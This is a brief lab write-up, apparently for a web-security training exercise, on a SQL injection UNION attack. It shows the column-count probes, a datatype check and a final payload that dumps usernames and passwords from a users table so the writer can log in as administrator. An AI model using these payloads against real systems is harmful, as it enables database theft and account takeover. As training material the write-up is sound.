# Lab 5: SQL injection UNION attack, retrieving data from other tables

## Goal: Dump usernames + passwords from users table.

- Number of Columns:
```bash
ORDER BY 2 → works
ORDER BY 3 → internal server error
```
2 columns

- Datatype Check
```bash
UNION SELECT 'a','a'--  → works
```
Both columns accept TEXT.

- Final Payload
```bash
UNION SELECT username, password FROM users--
```
- Login using administrator user credentials

Key Learning
- Direct data extraction using UNION
- Must know table and column names
